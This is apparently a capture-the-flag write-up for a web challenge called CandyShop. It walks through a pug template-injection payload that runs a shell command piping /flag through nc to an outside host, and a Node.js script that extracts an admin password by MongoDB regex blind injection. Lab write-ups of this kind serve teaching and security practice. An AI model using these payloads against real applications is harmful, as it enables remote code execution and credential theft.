## CandyShop

[Attachment](https://github.com/catmunch/oss/blob/master/CandyShop.zip?raw=true)

Read the source code of the website, we'll find out that it's driven by express.js & pug template engine.

Then we'll find out the wrong usage of pug in the code:

`src/routes/shop.js`

```javascript
router.post('/order', checkLogin, checkActive, async (req, res) => {
    let {username, candyname, address} = req.body
    let tpl_path = path.join(__dirname, '../views/confirm.pug')
    fs.readFile(tpl_path, (err, result) => {
        if (err) {
            res.render('error', {error: 'Fail to load template!'})
        } else {
            let tpl = result
                .toString()
                .replace('USERNAME', username)
                .replace('CANDYNAME', candyname)
                .replace('ADDRESS', address)
            res.send(pug.render(tpl, options={filename: tpl_path}))
        }
    })
})
```

It uses simply REPLACE to inject the info, rather than use the pug engine!

Then we can try to let the pug execute arbitrary code on the server side. Google it, and we know we just need to prepend `- ` to our javascript code, then it should work fine.

So we let the username be

```javascript
')
                        - process.mainModule.constructor._load('child_process').exec('cat /flag | nc 8.8.8.8 8888 ')
                        .p('
```

Then after it's injected to the template, the template should be like

```javascript
extends layout


block content
    .container
        .row.justify-content-center
            .col-6.mt-5
                .card
                    .card-header.text-center.font-weight-bold(style='background-color: pink;color: white') Confirm Your Order
                    .card-body
                    form(action='/shop/confirm' method='POST')
                        .form-group.row
                            label.col-form-label.text-md-right.col-4(for='username') User Name
                            .col-6
                                input#username.form-control(type='text' name='username' value='')
                        - process.mainModule.constructor._load('child_process').exec('cat /flag | nc 8.8.8.8 8888 ')
                        .p('' readonly)
                        .form-group.row
                            label.col-form-label.text-md-right.col-4(for='candyname') Candy Name
                            .col-6
                                input#candyname.form-control(type='text' name='candyname' value='CANDYNAME' readonly)
```

Then our code can be executed and we can get the flag.



But wait, we can't call the `POST /order` API cause we don't have an active account. so we should active our account or just use the admin account.

Sadly there's probably no way to active an account, so we can try to get the admin password.



How?

Observe the login code carefully, there seems to be a useless `if` statement

```javascript
let rec = await db.Users.find({username: username, password: password})
if (rec) {
    if (rec.username === username && rec.password === password) {
        res.cookie('token', rec, {signed: false})
        res.redirect('/shop')
    } else {
        res.render('login', {error: 'You Bad Bad >_<'})
    }
} else {
    res.render('login', {error: 'Login Failed!'})
}
```

How can mongodb find a user that its username or password doesn't equal to the input one?

We then find another snippet

```javascript
router.post('/register', async (req, res) => {
    let {username, password} = req.body
    if (typeof(username) !== 'string')
        return res.status(400)
```

Seems like if the username isn't a string, it will cause some unexpected behaviors.

Then we search for the mongodb docs, and we found out we can pass an object to it to perform advanced search like regex.

Therefore, we can try to post /login with parameter `password[$regex]=*`, and we get the response `You Bad Bad >_<`.

But if the regex doesn't match the password, we'll get `Login Failed`.

So just use SQL blind injection, write a script to get the password

```javascript
const axios = require('axios');
async function test(known) {
    const params = new URLSearchParams()
    params.append('username','rabbit');
    params.append('password[$regex]',`^${known}.*$`);
    const res = await axios.post('http://<target host>/user/login',params,{
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    })
    return res.data.indexOf('You Bad Bad') !== -1
}
charset = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']
cur = ''
async function main(){
    for(let i=0;i<64;++i){
        for(let j=0;j<16;++j){
            if(await test(cur+charset[j])){
                cur += charset[j]
                process.stdout.write(charset[j]);
                break
            }
        }
    }
}
main()
```

Then we can get the flag.
